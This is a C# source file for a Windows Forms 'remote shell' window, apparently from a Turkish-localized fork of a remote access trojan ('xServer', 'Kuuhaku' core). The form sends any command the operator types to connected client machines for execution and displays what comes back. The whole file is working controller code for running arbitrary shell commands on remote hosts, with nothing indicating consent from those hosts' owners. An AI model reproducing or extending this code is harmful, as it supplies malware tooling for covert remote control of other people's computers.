using System;
using System.Windows.Forms;
using System.Drawing;
using xServer.KuuhakuCekirdek.Yardımcılar;
using xServer.KuuhakuCekirdek.Ağ;

namespace xServer.Formlar
{
    public interface IRemoteShell
    {
        void PrintMessage(string message);
        void PrintError(string errorMessage);
    }

    public partial class FrmUzakKabuk : Form, IRemoteShell
    {
        private readonly Client _connectClient;

        public FrmUzakKabuk(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmRs = this;

            InitializeComponent();

            txtConsoleOutput.AppendText(">> Bu oturumu kapatmak için 'exit' yazmalısınız." + Environment.NewLine);
        }

        private void FrmRemoteShell_Load(object sender, EventArgs e)
        {
            this.DoubleBuffered = true;

            if (_connectClient != null)
                this.Text = PencereYardımcısı.GetWindowTitle("Uzak Kabuk", _connectClient);
        }

        private void FrmRemoteShell_FormClosing(object sender, FormClosingEventArgs e)
        {
            new KuuhakuCekirdek.Paketler.ServerPaketleri.DoShellExecute("exit").Execute(_connectClient);
            if (_connectClient.Value != null)
                _connectClient.Value.FrmRs = null;
        }

        private void txtConsoleOutput_TextChanged(object sender, EventArgs e)
        {
            NativeMethodsHelper.ScrollToBottom(txtConsoleOutput.Handle);
        }

        private void txtConsoleInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter && !string.IsNullOrEmpty(txtConsoleInput.Text.Trim()))
            {
                string input = txtConsoleInput.Text.TrimStart(' ', ' ').TrimEnd(' ', ' ');
                txtConsoleInput.Text = string.Empty;

                string[] splitSpaceInput = input.Split(' ');
                string[] splitNullInput = input.Split(' ');

                if (input == "exit" ||
                    ((splitSpaceInput.Length > 0) && splitSpaceInput[0] == "exit") ||
                    ((splitNullInput.Length > 0) && splitNullInput[0] == "exit"))
                {
                    this.Close();
                }
                else
                {
                    switch (input)
                    {
                        case "cls":
                            txtConsoleOutput.Text = string.Empty;
                            break;
                        default:
                            new KuuhakuCekirdek.Paketler.ServerPaketleri.DoShellExecute(input).Execute(_connectClient);
                            break;
                    }
                }

                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        private void txtConsoleOutput_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar != (char) 2)
            {
                txtConsoleInput.Text += e.KeyChar.ToString();
                txtConsoleInput.Focus();
                txtConsoleInput.SelectionStart = txtConsoleOutput.TextLength;
                txtConsoleInput.ScrollToCaret();
            }
        }

        public void PrintMessage(string message)
        {
            try
            {
                txtConsoleOutput.Invoke((MethodInvoker)delegate
                {
                    txtConsoleOutput.SelectionColor = Color.WhiteSmoke;
                    txtConsoleOutput.AppendText(message);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void PrintError(string errorMessage)
        {
            try
            {
                txtConsoleOutput.Invoke((MethodInvoker)delegate
                {
                    txtConsoleOutput.SelectionColor = Color.Red;
                    txtConsoleOutput.AppendText(errorMessage);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }
    }
}